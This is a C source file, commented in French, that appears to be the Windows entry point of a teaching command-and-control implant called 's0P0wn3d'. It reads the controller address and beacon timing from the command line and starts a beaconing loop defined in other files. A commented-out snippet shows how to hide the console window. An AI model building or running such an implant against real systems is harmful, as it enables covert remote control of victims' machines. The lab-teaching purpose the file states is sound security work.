/*
 * s0P0wn3d — Point d'entrée de l'implant (Windows).
 *
 * Collecte les infos système, s'enregistre auprès du contrôleur,
 * puis entre dans la boucle de beaconing.
 *
 * Usage: s0p0wn3d_implant.exe [controller_host] [port] [interval] [jitter]
 *   controller_host par défaut: 127.0.0.1
 *   port par défaut: 8443
 *   interval par défaut: 5 secondes
 *   jitter par défaut: 2 secondes
 *
 * AVERTISSEMENT : Outil pédagogique uniquement.
 * Utiliser uniquement en environnement de laboratoire contrôlé.
 */

#include "beacon.h"
#include "../shared/protocol.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef _DEBUG
#include <crtdbg.h>
#endif

int main(int argc, char *argv[]) {
    /* Paramètres par défaut */
    const char *controller_host = "127.0.0.1";
    int port = S0P_CONTROLLER_PORT;
    int interval = DEFAULT_BEACON_INTERVAL;
    int jitter = DEFAULT_JITTER;

    /* Parser les arguments */
    if (argc > 1) controller_host = argv[1];
    if (argc > 2) port = atoi(argv[2]);
    if (argc > 3) interval = atoi(argv[3]);
    if (argc > 4) jitter = atoi(argv[4]);

    /* Console discrète en mode release */
#ifndef _DEBUG
    /* En production, on pourrait cacher la console:
       HWND hWnd = GetConsoleWindow();
       ShowWindow(hWnd, SW_HIDE);
       Ici on la garde pour la démonstration pédagogique. */
#endif

    printf("s0P0wn3d Implant v%s\n", S0P_VERSION);
    printf("Contrôleur: %s:%d\n", controller_host, port);
    printf("Interval: %ds (jitter ±%ds)\n\n", interval, jitter);

    /* Démarrer la boucle de beaconing (bloquant) */
    int ret = beacon_loop(controller_host, port, interval, jitter);

    if (ret != 0) {
        fprintf(stderr, "[-] Erreur fatale dans la boucle de beaconing\n");
    }

    return ret;
}
